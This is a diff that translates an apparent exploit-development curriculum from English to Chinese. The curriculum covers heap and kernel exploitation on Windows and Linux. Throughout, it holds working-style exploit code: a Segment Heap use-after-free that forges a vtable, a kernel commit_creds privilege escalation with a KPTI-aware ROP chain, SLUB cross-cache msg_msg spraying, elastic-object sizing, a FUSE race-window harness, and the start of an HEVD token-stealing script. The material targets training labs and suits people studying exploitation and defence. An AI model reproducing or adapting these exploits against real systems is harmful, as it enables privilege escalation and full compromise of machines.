     if (!heap) { perror("HeapCreate"); return 1; }
 
-    // ---- Phase 1: Spray to prime the VS allocator for 0x80-byte class --------
-    // Allocate + free 32 times to ensure LFH bucket is warm for 0x80-byte class
+    // ---- 阶段 1：喷洒以为 0x80 字节类预热 VS 分配器 --------
+    // 分配 + 释放 32 次，确保 0x80 字节类的 LFH 桶已预热
     for (int i = 0; i < 32; i++) {
         void *p = HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(VictimObj));
         HeapFree(heap, 0, p);
     }
 
-    // ---- Phase 2: Allocate victim object and set up its vtable ----------------
+    // ---- 阶段 2：分配 victim 对象并设置其 vtable ----------------
     VictimObj *victim = (VictimObj *)HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(VictimObj));
     if (!victim) { perror("HeapAlloc victim"); return 1; }
 
-    // Point victim's vtable at a legitimate (safe) vtable:
+    // 将 victim 的 vtable 指向一个合法（安全）的 vtable：
     void (*safe_vtable[1])(void) = { (void(*)(void))puts };
     victim->vtable   = safe_vtable;
     victim->refCount = 1;
@@ -1067,37 +1067,37 @@ int main(void) {
     printf("[*] VictimObj at: %p\n", victim);
     printf("[*] VictimObj->vtable: %p -> %p\n", victim->vtable, victim->vtable[0]);
 
-    // ---- Phase 3: Free victim -- creates UAF condition -------------------------
+    // ---- 阶段 3：释放 victim——制造 UAF 条件 -------------------------
     HeapFree(heap, 0, victim);
-    // victim pointer is now DANGLING (stale reference retained)
-    // In a real UAF bug: some other code path still holds a pointer to this chunk.
-    // The VS allocator has returned the chunk to its free list.
+    // victim 指针现在悬垂（保留了过期引用）
+    // 在真实 UAF 缺陷中：其他代码路径仍然持有指向该块的指针。
+    // VS 分配器已将该块归还到其空闲链表。
 
-    // ---- Phase 4: Re-allocate with ControlObj of same size --------------------
+    // ---- 阶段 4：用同样大小的 ControlObj 重新分配 --------------------
     ControlObj *ctrl = (ControlObj *)HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(ControlObj));
     if (!ctrl) { perror("HeapAlloc ctrl"); return 1; }
 
-    // Segment Heap VS allocator serves requests from the same size class.
-    // With high probability, ctrl occupies the same memory as victim.
-    // Verify in WinDbg: 'dp victim_addr' and 'dp ctrl_addr' -- same address.
+    // Segment 堆的 VS 分配器从相同大小类中服务请求。
+    // 很可能 ctrl 占据与 victim 相同的内存。
+    // 在 WinDbg 中验证：'dp victim_addr' 与 'dp ctrl_addr'——地址相同。
 
     printf("[*] ControlObj at: %p\n", ctrl);
     printf("[*] Same memory as victim? %s\n",
            (void*)ctrl == (void*)victim ? "YES (exploit works)" : "NO (retry with more spray)");
 
-    // ---- Phase 5: Write forged vtable pointer at offset 0 ---------------------
-    // offset 0 of ControlObj (gadget_addr) overlaps offset 0 of VictimObj (vtable)
+    // ---- 阶段 5：在偏移 0 处写入伪造的 vtable 指针 ---------------------
+    // ControlObj 的偏移 0（gadget_addr）与 VictimObj 的偏移 0（vtable）重叠
     ctrl->gadget_addr = (ULONG_PTR)fake_vtable;
-    memset(ctrl->padding, 0xCC, sizeof(ctrl->padding));  // fill rest with int3 for visibility
+    memset(ctrl->padding, 0xCC, sizeof(ctrl->padding));  // 其余部分用 int3 填充以便观察
 
     printf("[*] Forged vtable at: %p, points to: %p\n",
            fake_vtable, fake_vtable[0]);
 
-    // ---- Phase 6: Trigger UAF -- code execution -------------------------------
-    // The application's stale victim pointer still exists.
-    // When it calls victim->vtable[0](victim), we execute evil_payload.
+    // ---- 阶段 6：触发 UAF——代码执行 -------------------------------
+    // 应用的过期 victim 指针仍然存在。
+    // 当它调用 victim->vtable[0](victim) 时，我们执行 evil_payload。
     printf("[*] Triggering UAF call on stale victim pointer...\n");
-    victim->vtable[0]();   // dereferences forged vtable -> evil_payload()
+    victim->vtable[0]();   // 解引用伪造的 vtable -> evil_payload()
 
     HeapDestroy(heap);
     return 0;
@@ -1105,48 +1105,48 @@ int main(void) {
 ```
 
 ```
-DEBUGGING IN WINDBG:
-After HeapFree(victim) and before HeapAlloc(ctrl):
-  !heap -x <victim_addr>        -- shows the freed chunk's status
-  dp <victim_addr>              -- inspect raw memory
+在 WINDBG 中调试：
+在 HeapFree(victim) 之后、HeapAlloc(ctrl) 之前：
+  !heap -x <victim_addr>        ——显示已释放块的状态
+  dp <victim_addr>              ——检查原始内存
 
-After HeapAlloc(ctrl):
-  dp <ctrl_addr>                -- confirm same address as victim
-  dp <ctrl_addr+0>              -- offset 0: should be our fake_vtable address
+在 HeapAlloc(ctrl) 之后：
+  dp <ctrl_addr>                ——确认与 victim 地址相同
+  dp <ctrl_addr+0>              ——偏移 0：应为我们的 fake_vtable 地址
 
-After forging:
-  dps <fake_vtable_addr>        -- show vtable contents -> evil_payload pointer
+伪造之后：
+  dps <fake_vtable_addr>        ——显示 vtable 内容 -> evil_payload 指针
 
-NOTES ON SEGMENT HEAP COOKIES:
-  VS chunk headers are XOR'd with a per-heap random seed (the "cookie").
-  Corrupting the header directly requires knowing the seed.
-  This exploit avoids header corruption entirely by targeting
-  the OBJECT CONTENT (vtable pointer), not the heap metadata.
-  This is the preferred modern technique because:
-  1. It does not trigger VS coalescing
-  2. It bypasses header cookie validation
-  3. It works even when Safe Unlinking is active
+关于 SEGMENT 堆 COOKIE 的说明：
+  VS 块头与每个堆的随机种子（即 "cookie"）进行 XOR。
+  直接破坏头部需要知道种子。
+  本利用完全避免破坏头部，而是针对
+  对象内容（vtable 指针），而非堆元数据。
+  这是首选的现代技术，因为：
+  1. 它不会触发 VS 合并
+  2. 它绕过头部 cookie 校验
+  3. 即使 Safe Unlinking 启用也有效
 ```
 
 ---
 
-## BLOCK 7: LINUX KERNEL EXPLOITATION
+## 区块 7：Linux 内核利用
 
-**Time: 4-6 weeks | Difficulty: Extreme**
+**时间：4-6 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [Linux Kernel Exploitation - YouTube](https://www.youtube.com/watch?v=il1wGXeKJAo) | YouTube | 3 hrs | FREE | Module interaction and techniques |
-| [pwn.college Kernel Exploitation](https://pwn.college/system-security/kernel-security/) | Platform | 20 hrs | FREE | Structured, starts from basics |
-| [lkmidas kernel series](https://lkmidas.github.io/) | Blog | 10 hrs | FREE | CTF kernel series. Read all parts. |
-| [Linux Device Drivers LDD3](https://lwn.net/Kernel/LDD3/) | Book | 30 hrs | FREE | Understanding driver internals |
+| [Linux 内核利用 - YouTube](https://www.youtube.com/watch?v=il1wGXeKJAo) | YouTube | 3 小时 | 免费 | 模块交互与技术 |
+| [pwn.college 内核利用](https://pwn.college/system-security/kernel-security/) | 平台 | 20 小时 | 免费 | 结构化，从基础开始 |
+| [lkmidas 内核系列](https://lkmidas.github.io/) | 博客 | 10 小时 | 免费 | CTF 内核系列。读完所有部分。 |
+| [Linux 设备驱动 LDD3](https://lwn.net/Kernel/LDD3/) | 书籍 | 30 小时 | 免费 | 理解驱动内部结构 |
 
-### QEMU Kernel Lab Setup
+### QEMU 内核实验环境搭建
 
 ```bash
-# Build a vulnerable kernel for practice:
+# 构建一个存在漏洞的内核用于练习：
 wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz
 tar -xf linux-5.15.tar.xz && cd linux-5.15
 
@@ -1163,7 +1163,7 @@ CONFIG_SLAB=y
 EOF
 make -j$(nproc)
 
-# Create minimal rootfs with busybox:
+# 用 busybox 创建最小 rootfs：
 wget https://busybox.net/downloads/busybox-1.35.0.tar.bz2
 tar -xf busybox-1.35.0.tar.bz2 && cd busybox-1.35.0
 make defconfig && make CONFIG_STATIC=y -j$(nproc) && make install
@@ -1181,7 +1181,7 @@ INITEOF
 chmod +x ../rootfs/init
 (cd ../rootfs && find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz)
 
-# Launch QEMU with GDB stub:
+# 带 GDB stub 启动 QEMU：
 qemu-system-x86_64 \
     -kernel arch/x86/boot/bzImage \
     -initrd rootfs.cpio.gz \
@@ -1189,19 +1189,19 @@ qemu-system-x86_64 \
     -nographic \
     -s -S
 
-# Connect GDB:
+# 连接 GDB：
 gdb vmlinux
 target remote :1234
 c
 b commit_creds
 ```
 
-### Kernel Exploit -- commit_creds Pattern
+### 内核利用——commit_creds 模式
 
 ```c
-// File: kernel_exploit.c
-// Pattern: Kernel UAF/overflow -> kernel code execution
-//          -> commit_creds(prepare_kernel_cred(NULL)) -> SYSTEM privileges
+// 文件：kernel_exploit.c
+// 模式：内核 UAF/溢出 -> 内核代码执行
+//          -> commit_creds(prepare_kernel_cred(NULL)) -> SYSTEM 权限
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -1263,7 +1263,7 @@ int main() {
 }
 ```
 
-### Kernel Mitigations and Bypasses
+### 内核缓解措施与绕过
 
 <div align="center">
 <table><tr><td>
@@ -1275,14 +1275,14 @@ int main() {
 
 
 ```c
-// KPTI-aware return from kernel ROP to userspace:
+// 从内核 ROP 返回到用户态的 KPTI 感知方式：
 unsigned long kpti_trampoline = KASLR_BASE + 0x800e26;
 
 size_t rop_chain[] = {
-    // ... commit_creds gadgets ...
+    // ... commit_creds gadget ...
     kpti_trampoline,
-    0,              // padding (trampoline pops this)
-    0,              // padding
+    0,              // 填充（trampoline 会弹出它）
+    0,              // 填充
     (size_t)post_exploit,   // rip
     user_cs,
     user_rflags,
@@ -1293,44 +1293,44 @@ size_t rop_chain[] = {
 
 ---
 
-## BLOCK 8: LINUX KERNEL SLUB/SLAB EXPLOITATION
+## 区块 8：Linux 内核 SLUB/Slab 利用
 
-**Time: 2-3 weeks | Difficulty: Extreme**
+**时间：2-3 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [CVE-2022-0995 Analysis](https://www.openwall.com/lists/oss-security/2022/03/29/4) | Write-up | 3 hrs | FREE | Real SLUB exploit on modern kernel |
-| [Kernel Heap Feng Shui SLUB](https://duasynt.com/blog/linux-kernel-heap-feng-shui-slub) | Blog | 4 hrs | FREE | Feng shui techniques for SLUB |
-| [io_uring Heap Grooming](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) | Blog | 3 hrs | FREE | Modern heap grooming primitives |
-| [kernelpop](https://github.com/spencerdodd/kernelpop) | GitHub | 2 hrs | FREE | Reference for real CVE patterns |
+| [CVE-2022-0995 分析](https://www.openwall.com/lists/oss-security/2022/03/29/4) | 分析文章 | 3 小时 | 免费 | 现代内核上的真实 SLUB 利用 |
+| [内核堆风水 SLUB](https://duasynt.com/blog/linux-kernel-heap-feng-shui-slub) | 博客 | 4 小时 | 免费 | 针对 SLUB 的风水技术 |
+| [io_uring 堆布局](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) | 博客 | 3 小时 | 免费 | 现代堆布局原语 |
+| [kernelpop](https://github.com/spencerdodd/kernelpop) | GitHub | 2 小时 | 免费 | 真实 CVE 模式参考 |
 
-### SLUB Allocator Internals
+### SLUB 分配器内部结构
 
 ```
-The SLUB allocator is the default Linux kernel memory allocator since kernel 2.6.23.
+自内核 2.6.23 起，SLUB 分配器就是 Linux 内核的默认内存分配器。
 
-SLUB ARCHITECTURE:
-  Objects of the same size share a "slab" (one or more pages).
-  Each size class has its own per-CPU cache (kmem_cache_cpu).
-  Per-CPU free list: singly-linked list through the objects themselves.
+SLUB 架构：
+  相同大小的对象共享一个 "slab"（一个或多个页）。
+  每个大小类都有自己的每 CPU 缓存（kmem_cache_cpu）。
+  每 CPU 空闲链表：通过对象自身串联的单向链表。
 
-FREE OBJECT STRUCTURE:
-  Free objects contain a forward pointer at offset 0.
-  On kernel >= 6.1: pointer is obfuscated with a per-slab random seed
-  (similar to Safe-Linking in glibc).
+空闲对象结构：
+  空闲对象在偏移 0 处包含一个前向指针。
+  在内核 >= 6.1 上：指针会与每个 slab 的随机种子进行混淆
+  （类似 glibc 中的 Safe-Linking）。
 
-KEY INSIGHT: Objects of DIFFERENT struct types but SAME SIZE share the same slab.
-This is the foundation of cross-cache and type confusion attacks.
+关键洞见：结构体类型不同但大小相同的对象共享同一个 slab。
+这是跨缓存攻击与类型混淆攻击的基础。
 ```
 
-### Cross-Cache Attack with msg_msg Spray
+### 使用 msg_msg 喷洒的跨缓存攻击
 
 ```c
-// File: slub_crosscache.c
-// Technique: SLUB cross-cache UAF using msg_msg spray
-// Target: custom vulnerable kernel module with kmalloc(96) alloc
+// 文件：slub_crosscache.c
+// 技术：使用 msg_msg 喷洒的 SLUB 跨缓存 UAF
+// 目标：带 kmalloc(96) 分配的自定义存在漏洞的内核模块
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -1345,16 +1345,16 @@ This is the foundation of cross-cache and type confusion attacks.
 #define IOCTL_FREE     0x1002
 #define IOCTL_TRIGGER  0x1003
 
-#define TARGET_SIZE    96     // must match kmalloc size in the vulnerable module
-#define MSG_SIZE       (TARGET_SIZE - sizeof(long))  // mtype is sizeof(long)
+#define TARGET_SIZE    96     // 必须与存在漏洞的模块中的 kmalloc 大小匹配
+#define MSG_SIZE       (TARGET_SIZE - sizeof(long))  // mtype 为 sizeof(long)
 
-void kernel_payload();   // forward declaration
+void kernel_payload();   // 前向声明
 
 int main(void) {
     int fd = open(VULN_DEVICE, O_RDWR);
     if (fd < 0) { perror("open"); exit(1); }
 
-    // Phase 1: Spray -- fill kmem_cache-96 with msg_msg objects
+    // 阶段 1：喷洒——用 msg_msg 对象填满 kmem_cache-96
     int msqids[256];
     struct {
         long mtype;
@@ -1372,17 +1372,17 @@ int main(void) {
         msgsnd(msqids[i], &spray_msg, MSG_SIZE, 0);
     }
 
-    // Phase 2: Allocate target struct via vulnerable module
+    // 阶段 2：通过存在漏洞的模块分配目标结构体
     ioctl(fd, IOCTL_ALLOC, TARGET_SIZE);
 
-    // Phase 3: Free the target struct -- creates UAF
+    // 阶段 3：释放目标结构体——制造 UAF
     ioctl(fd, IOCTL_FREE, 0);
 
-    // Phase 4: Pressure-fill the freed slot
+    // 阶段 4：压力填充已释放的槽位
     int msqid_win = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
     msgsnd(msqid_win, &spray_msg, MSG_SIZE, 0);
 
-    // Phase 5: Trigger UAF
+    // 阶段 5：触发 UAF
     ioctl(fd, IOCTL_TRIGGER, 0);
 
     if (getuid() == 0) {
@@ -1395,31 +1395,31 @@ int main(void) {
 }
 ```
 
-### Elastic Objects Technique (GAP CLOSED)
+### 弹性对象技术（缺口已补齐）
 
-The elastic objects technique uses `msg_msg` extended messages that can be resized at allocation time to bridge different size classes. It allows an attacker to reach a target in a different kmem_cache by resizing the spray object.
+弹性对象技术使用可在分配时调整大小的 `msg_msg` 扩展消息，以桥接不同的大小类。它允许攻击者通过调整喷洒对象的大小来触达位于不同 kmem_cache 中的目标。
 
 ```c
-// File: elastic_objects.c
-// Technique: msg_msg elastic sizing to bridge size classes
+// 文件：elastic_objects.c
+// 技术：用 msg_msg 弹性尺寸桥接大小类
 //
-// THEORY:
-// A msg_msg header is fixed (48 bytes on x86-64).
-// The message text follows immediately.
-// Total allocation: sizeof(msg_msg) + msg_text_size
-// By choosing msg_text_size, you control which kmem_cache the msg lands in.
+// 理论：
+// msg_msg 头部是固定的（x86-64 上为 48 字节）。
+// 消息文本紧随其后。
+// 总分配大小：sizeof(msg_msg) + msg_text_size
+// 通过选择 msg_text_size，你可以控制 msg 落入哪个 kmem_cache。
 //
-// Example: target struct is 192 bytes (kmem_cache-192).
-//          sizeof(msg_msg) = 48 bytes.
-//          We need: 48 + text_size = 192
-//          So: text_size = 144 bytes
+// 示例：目标结构体为 192 字节（kmem_cache-192）。
+//          sizeof(msg_msg) = 48 字节。
+//          我们需要：48 + text_size = 192
+//          所以：text_size = 144 字节
 //
-// This lets you spray into ANY slab cache by choosing the right msg_text size.
+// 这样你就可以通过选择合适的 msg_text 大小，向任意 slab 缓存喷洒。
 //
-// EXTENDED msg_msg (SEG_MSG) for large targets:
-// If target > 4096 - sizeof(msg_msg), the message body spans multiple
-// msg_msgseg structs. The first seg is in kmem_cache, the rest in page allocator.
-// This extends the attack surface to large kernel objects.
+// 用于大目标的扩展 msg_msg（SEG_MSG）：
+// 如果 target > 4096 - sizeof(msg_msg)，消息体会跨越多个
+// msg_msgseg 结构体。第一个 seg 位于 kmem_cache，其余位于页分配器。
+// 这将攻击面扩展到大型内核对象。
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -1427,33 +1427,33 @@ The elastic objects technique uses `msg_msg` extended messages that can be resiz
 #include <sys/msg.h>
 #include <unistd.h>
 
-// msg_msg internal structure (from kernel source include/linux/msg.h):
+// msg_msg 内部结构（来自内核源码 include/linux/msg.h）：
 // struct msg_msg {
-//     struct list_head  m_list;   // 16 bytes (two pointers)
-//     long              m_type;   //  8 bytes
-//     size_t            m_ts;     //  8 bytes  (message text size)
-//     struct msg_msgseg *next;    //  8 bytes
-//     void              *security;//  8 bytes
-// };                              // = 48 bytes total
+//     struct list_head  m_list;   // 16 字节（两个指针）
+//     long              m_type;   //  8 字节
+//     size_t            m_ts;     //  8 字节（消息文本大小）
+//     struct msg_msgseg *next;    //  8 字节
+//     void              *security;//  8 字节
+// };                              // = 总共 48 字节
 #define MSG_MSG_HDR_SIZE  48
 
-// Build a spray message that lands in the EXACT kmem_cache for a given target size:
+// 构建一条喷洒消息，使其落入给定目标大小对应的确切 kmem_cache：
 int spray_elastic(int msqid, size_t target_kmalloc_size,
                   void *payload, size_t payload_size)
 {
-    // Calculate text size to land in target_kmalloc_size cache:
+    // 计算文本大小，以落入 target_kmalloc_size 缓存：
     size_t text_size = target_kmalloc_size - MSG_MSG_HDR_SIZE;
 
-    // Minimum text: 1 byte (msg_ts must be > 0)
+    // 最小文本：1 字节（msg_ts 必须 > 0）
     if (text_size < payload_size || text_size < 1) {
         fprintf(stderr, "Target size %zu too small for msg_msg\n", target_kmalloc_size);
         return -1;
     }
 
-    // Build message: payload at front (overlaps interesting fields in target struct)
+    // 构建消息：载荷放在最前面（与目标结构体中有意义的字段重叠）
     struct msgbuf {
         long mtype;
-        char mtext[4096];   // max single-segment msg
+        char mtext[4096];   // 最大单段消息
     } msg;
 
     msg.mtype = 1;
@@ -1473,27 +1473,27 @@ int spray_elastic(int msqid, size_t target_kmalloc_size,
     return 0;
 }
 
-// Example: spray to reach kmem_cache-192 (target struct is 192 bytes)
+// 示例：喷洒以触达 kmem_cache-192（目标结构体为 192 字节）
 int main(void) {
-    size_t target_struct_size = 192;   // change to match your target
+    size_t target_struct_size = 192;   // 改为与你的目标匹配
 
-    // Payload at offset 0 in the message text overlaps offset MSG_MSG_HDR_SIZE
-    // in the target struct (if the target struct's interesting field is at that offset,
-    // adjust accordingly).
+    // 消息文本偏移 0 处的载荷会与目标结构体的
+    // 偏移 MSG_MSG_HDR_SIZE 重叠（如果目标结构体有意义字段在该偏移，
+    // 请相应调整）。
     //
-    // For a function pointer at offset 8 of the target struct:
-    // Padding = 8 - MSG_MSG_HDR_SIZE? No -- msg_msg HDR is BEFORE the text.
-    // The text starts at (target_struct_base + MSG_MSG_HDR_SIZE).
-    // So to overwrite offset 56 of the target struct:
-    //   text offset = 56 - 48 = 8 bytes into message text.
+    // 对于目标结构体偏移 8 处的函数指针：
+    // 填充 = 8 - MSG_MSG_HDR_SIZE？不——msg_msg 头部在文本之前。
+    // 文本起始于 (target_struct_base + MSG_MSG_HDR_SIZE)。
+    // 因此要覆盖目标结构体的偏移 56：
+    //   文本偏移 = 56 - 48 = 消息文本中的 8 字节处。
     size_t fn_ptr_offset_in_target = 56;
     size_t text_offset = fn_ptr_offset_in_target - MSG_MSG_HDR_SIZE;
 
-    size_t fake_fn = (size_t)0xdeadbeefcafe1234;  // replace with real payload fn
+    size_t fake_fn = (size_t)0xdeadbeefcafe1234;  // 替换为真实的载荷函数
     char payload[64] = {0};
     memcpy(payload + text_offset, &fake_fn, 8);
 
-    // Create 512 queues for wide spray coverage:
+    // 创建 512 个队列以获得广泛的喷洒覆盖：
     int msqids[512];
     for (int i = 0; i < 512; i++) {
         msqids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
@@ -1509,29 +1509,29 @@ int main(void) {
 }
 ```
 
-### userfaultfd and FUSE Race Window (GAP CLOSED -- covers kernel 5.11+)
+### userfaultfd 与 FUSE 竞争窗口（缺口已补齐——覆盖内核 5.11+）
 
-`userfaultfd` from unprivileged users was restricted in kernel 5.11+. For modern kernels, FUSE provides an equivalent controlled delay.
+`userfaultfd` 对非特权用户的限制始于内核 5.11+。对于现代内核，FUSE 提供了等效的受控延迟。
 
 ```c
-// File: race_window_fuse.c
-// Purpose: create a controlled race window in kernel 5.11+ (where unprivileged
-//          userfaultfd is disabled) using FUSE filesystem operations.
+// 文件：race_window_fuse.c
+// 目的：在内核 5.11+ 中创建受控竞争窗口（该版本已禁用非特权
+//          userfaultfd），使用 FUSE 文件系统操作。
 //
-// HOW IT WORKS:
-// Mounting a FUSE filesystem lets you control when kernel operations on that
-// filesystem complete. When the kernel calls your FUSE handler (in userspace),
-// you can delay the response arbitrarily -- creating the same race window
-// that userfaultfd provided via page fault handling.
+// 工作原理：
+// 挂载 FUSE 文件系统让你可以控制内核对该文件系统的操作
+// 何时完成。当内核调用你的 FUSE 处理程序（在用户态）时，
+// 你可以任意延迟响应——从而创建与 userfaultfd 通过缺页处理
+// 所提供的相同的竞争窗口。
 //
-// USE CASE: race condition exploits where two kernel code paths must interleave:
-//   Path A: kernel allocates object, touches FUSE-backed file (stalls HERE)
-//   Path B: we free the object and spray in the window
-//   Resolution: we complete the FUSE operation, Path A continues with corrupted state.
+// 用例：需要两条内核代码路径交错执行的竞争条件利用：
+//   路径 A：内核分配对象，访问 FUSE 支持的文件（在此处停顿）
+//   路径 B：我们在窗口内释放对象并喷洒
+//   解决：我们完成 FUSE 操作，路径 A 带着被破坏的状态继续。
 //
-// SETUP REQUIREMENTS:
-//   - Linux with FUSE support: sudo apt install fuse libfuse-dev
-//   - Kernel module or CVE that performs file operations on an attacker-controlled path
+// 环境要求：
+//   - 支持 FUSE 的 Linux：sudo apt install fuse libfuse-dev
+//   - 对攻击者控制路径执行文件操作的内核模块或 CVE
 
 #define FUSE_USE_VERSION 31
 #include <fuse3/fuse.h>
@@ -1542,29 +1542,29 @@ int main(void) {
 #include <unistd.h>
 #include <pthread.h>
 
-// Race window state:
+// 竞争窗口状态：
 static volatile int race_window_open = 0;
 static volatile int race_triggered   = 0;
 
-// Called when the kernel reads the trigger file -- this is where we stall:
+// 当内核读取触发文件时调用——我们在此处停顿：
 static int fuse_read_trigger(const char *path, char *buf, size_t size,
                              off_t offset, struct fuse_file_info *fi)
 {
     (void)fi;
 
     if (strcmp(path, "/trigger") == 0) {
-        // Signal that we are now in the race window:
+        // 发出信号：我们现在已进入竞争窗口：
         race_window_open = 1;
         printf("[FUSE] Race window OPEN -- spray now\n");
 
-        // Wait until spray is complete:
+        // 等待喷洒完成：
         while (!race_triggered) {
-            usleep(100);   // tight poll
+            usleep(100);   // 紧凑轮询
         }
         race_window_open = 0;
         printf("[FUSE] Race window CLOSED -- releasing kernel\n");
 
-        // Provide minimal valid data so the kernel operation succeeds:
+        // 提供最小有效数据，使内核操作成功：
         if (offset == 0 && size >= 1) {
             buf[0] = 'X';
             return 1;
@@ -1600,13 +1600,13 @@ static struct fuse_operations fuse_ops = {
     .read    = fuse_read_trigger,
 };
 
-// Attacker thread: waits for the race window and then sprays:
+// 攻击者线程：等待竞争窗口然后喷洒：
 void *spray_thread(void *arg) {
     while (!race_window_open) usleep(10);
     printf("[SPRAY] Window open -- executing spray\n");
 
-    // ---- INSERT YOUR SPRAY CODE HERE ----
-    // Example: spray msg_msg objects into the freed kmem_cache slot
+    // ---- 在此处插入你的喷洒代码 ----
+    // 示例：将 msg_msg 对象喷洒到已释放的 kmem_cache 槽位
     // spray_elastic(msqids[i], target_size, payload, sizeof(payload));
     // --------------------------------------
 
@@ -1622,11 +1622,11 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    // Start the spray thread (waits for the race window):
+    // 启动喷洒线程（等待竞争窗口）：
     pthread_t thr;
     pthread_create(&thr, NULL, spray_thread, NULL);
 
-    // Mount FUSE filesystem (blocks until unmounted or error):
+    // 挂载 FUSE 文件系统（阻塞直到卸载或出错）：
     printf("[*] Mounting FUSE at %s\n", argv[1]);
     printf("[*] Trigger race by: cat %s/trigger\n", argv[1]);
     printf("[*] Or have kernel code path read /trigger via your exploit\n");
@@ -1638,81 +1638,81 @@ int main(int argc, char *argv[]) {
 ```
 
 ```bash
-# Build:
+# 构建：
 gcc -o race_fuse race_window_fuse.c $(pkg-config --cflags --libs fuse3) -lpthread
 
-# Use:
+# 使用：
 mkdir /tmp/fusemnt
 ./race_fuse /tmp/fusemnt &
 
-# From your exploit: trigger the kernel to read /tmp/fusemnt/trigger
-# The spray_thread fires in the race window automatically
-# Then the FUSE handler releases the kernel
-fusermount3 -u /tmp/fusemnt   # cleanup
+# 从你的利用程序：触发内核读取 /tmp/fusemnt/trigger
+# spray_thread 会在竞争窗口内自动触发
+# 然后 FUSE 处理程序释放内核
+fusermount3 -u /tmp/fusemnt   # 清理
 ```
 
 ---
 
-## BLOCK 9: WINDOWS KERNEL EXPLOITATION
+## 区块 9：Windows 内核利用
 
-**Time: 4-6 weeks | Difficulty: Extreme**
+**时间：4-6 周 | 难度：极限**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [HEVD - HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | GitHub | 30 hrs | FREE | THE standard Windows kernel training target |
-| [Connor McGarr - Kernel Exploitation](https://connormcgarr.github.io/) | Blog | 8 hrs | FREE | Excellent modern technique write-ups |
-| [Windows Kernel Exploitation Workshop](https://github.com/rootkits-xyz/Windows-Kernel-Exploits) | GitHub | 10 hrs | FREE | Exploit collection with write-ups |
-| [Alex Ionescu - Windows Internals](https://www.youtube.com/watch?v=dhjvLEHiGBM) | YouTube | 3 hrs | FREE | Architecture context. Watch before exploiting. |
+| [HEVD - HackSys 极端易受攻击驱动](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | GitHub | 30 小时 | 免费 | Windows 内核训练的标准靶场 |
+| [Connor McGarr - 内核利用](https://connormcgarr.github.io/) | 博客 | 8 小时 | 免费 | 优秀的现代技术分析 |
+| [Windows 内核利用工作坊](https://github.com/rootkits-xyz/Windows-Kernel-Exploits) | GitHub | 10 小时 | 免费 | 带分析的利用合集 |
+| [Alex Ionescu - Windows 内部原理](https://www.youtube.com/watch?v=dhjvLEHiGBM) | YouTube | 3 小时 | 免费 | 架构背景。利用之前先看。 |
 
-### WinDbg Kernel Debugging Setup
+### WinDbg 内核调试环境搭建
 
 ```
-SETUP: Two Windows VMs
-  VM1 (DEBUGGER): runs WinDbg Preview
-  VM2 (TARGET):   runs HEVD driver
+环境搭建：两台 Windows 虚拟机
+  VM1（调试器）：运行 WinDbg Preview
+  VM2（目标机）：运行 HEVD 驱动
 
-VM2 (TARGET) -- run as Administrator:
+VM2（目标机）——以管理员身份运行：
   bcdedit /debug on
   bcdedit /dbgsettings net hostip:<VM1_IP> port:50000 key:1.2.3.4
   bcdedit /set testsigning on
   bcdedit /set nointegritychecks on
-  Reboot VM2
+  重启 VM2
 
-VM1 (DEBUGGER):
-  WinDbg Preview -> File -> Attach to Kernel -> Net tab
-  hostip: VM2's IP | port: 50000 | key: 1.2.3.4
+VM1（调试器）：
+  WinDbg Preview -> File -> Attach to Kernel -> Net 选项卡
+  hostip: VM2 的 IP | port: 50000 | key: 1.2.3.4
 ```
 
 ```
-Essential WinDbg Kernel Commands:
-  g                          continue execution
-  Ctrl+Break                 break into debugger
+WinDbg 内核常用命令：
+  g                          继续执行
+  Ctrl+Break                 中断进入调试器
 
-  lm m HEVD                  show HEVD.sys base address
-  !analyze -v                analyze crash/bugcheck
+  lm m HEVD                  显示 HEVD.sys 基址
+  !analyze -v                分析崩溃/蓝屏
 
-  dt nt!_EPROCESS            show EPROCESS structure layout
-  dt nt!_EPROCESS <addr>     inspect specific process
-  !process 0 0               list all processes
+  dt nt!_EPROCESS            显示 EPROCESS 结构布局
+  dt nt!_EPROCESS <addr>     检查特定进程
+  !process 0 0               列出所有进程
 
-  # TOKEN OFFSETS (Windows 10 22H2 -- VERIFY WITH YOUR BUILD via dt nt!_EPROCESS):
+  # 令牌偏移（Windows 10 22H2——务必用 dt nt!_EPROCESS 在你的构建上核实）：
   # UniqueProcessId:    0x440
   # ActiveProcessLinks: 0x448
   # Token:              0x4B8
 
-  dd <addr>                  display DWORDs
-  dq <addr>                  display QWORDs
-  u <addr>                   disassemble
-  bp nt!NtCreateFile         breakpoint on kernel function
-  ba w8 <addr>               hardware breakpoint on 8-byte WRITE
+  dd <addr>                  显示 DWORD
+  dq <addr>                  显示 QWORD
+  u <addr>                   反汇编
+  bp nt!NtCreateFile         在内核函数上下断点
+  ba w8 <addr>               对 8 字节写入设置硬件断点
 ```
 
-### HEVD Stack Overflow -- Token Stealing
+### HEVD 栈溢出——令牌窃取
 
 ```python
-# File: hevd_stack_overflow.py
+# 文件：hevd_stack_overflow.py
 import ctypes
 import subprocess
 from ctypes import windll, wintypes
@@ -1732,7 +1732,7 @@ device = windll.kernel32.CreateFileW(
 assert device != -1, f"CreateFile failed: {windll.kernel32.GetLastError()}"
 print(f"[+] Device handle: {hex(device)}")
 
-# EPROCESS offsets for Windows 10 22H2 -- ALWAYS verify with WinDbg dt nt!_EPROCESS
